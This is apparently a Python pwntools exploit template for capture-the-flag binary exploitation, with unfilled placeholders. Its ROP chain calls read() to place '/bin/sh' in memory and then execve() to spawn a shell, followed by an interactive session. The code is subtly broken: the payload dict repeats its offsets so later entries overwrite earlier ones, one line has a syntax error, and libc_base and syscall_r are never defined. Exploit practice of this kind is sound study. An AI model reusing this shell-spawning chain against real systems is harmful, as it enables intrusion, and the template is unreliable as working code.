#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# Title : Linux Pwn Exploit
# Author: {author} - {blog}
#
# Description:
# ------------
# A Python exp for Linux binex interaction
#
# Usage:
# ------
# - Local mode  : ./xpl.py
# - Remote mode : ./xpl.py [ <HOST> <PORT> | <HOST:PORT> ]
#

from pwnkit import *
from pwn import *
import sys

# CONFIG
# ---------------------------------------------------------------------------
BIN_PATH   = {file_path!r}
LIBC_PATH  = {libc_path!r}
host, port = load_argv(sys.argv[1:])
ssl  = {ssl}
env  = {{}}
elf  = ELF(BIN_PATH, checksec=False)
libc = ELF(LIBC_PATH) if LIBC_PATH else None

Context({arch!r}, {os!r}, {endian!r}, {log!r}, {term!r}).push()
io = Config(BIN_PATH, LIBC_PATH, host, port, ssl, env).run()
alias(io)	# s, sa, sl, sla, r, rl, ru, uu64, g, gp
init_pr("debug", "%(asctime)s - %(levelname)s - %(message)s", "%H:%M:%S")

# EXPLOIT
# ---------------------------------------------------------------------------
def exploit(*args, **kwargs):
   
    # TODO: exploit chain





	# After leak libc_base
	libc.address = libc_base

	ggs 	= ROPGadgets(libc)
	p_rdi_r = ggs['p_rdi_r']
	p_rsi_r = ggs['p_rsi_r']
	p_rax_r = ggs['p_rax_r']
	p_rsp_r = ggs['p_rsp_r']
	p_rdx_rbx_r = ggs['p_rdx_rbx_r']
	leave_r = ggs['leave_r']
	ret 	= ggs['ret']

	ggs.dump()

	buf  = 0xdeadbeef	# address to write "/bin/sh\x00"
	fd   = 0

	pl = flat({
		# read(fd, buf, size)
		0x0:  [p_rdi_r, fd],			
		0x10: [p_rsi_r, buf],			
		0x20: [p_rdx_rbx_r, 8, 0],		# read size
		0x38: [p_rax_r, 0],				# syscall number for read
		0x48: syscall_r,
		# execve(buf, 0, 0)
		0x0:  [p_rdi_r, buf],			# 1st param: buf
		0x10: [p_rsi_r, 0],				# 2nd param: argv[] = NULL
		0x20: [p_rdx_rbx_r, 0, 0],		# 3rd param: envp[] = NULL
		0x38: [p_rax_r, 0x3b],			# syscall number 59 for execve
		0x48: syscall_r,    
	}, filler'\0')

	sa(b'', pl)
	sleep(1.337)
	s(b"/bin/sh\x00")	# send to buf

    io.interactive()

# PIPELINE
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    exploit()

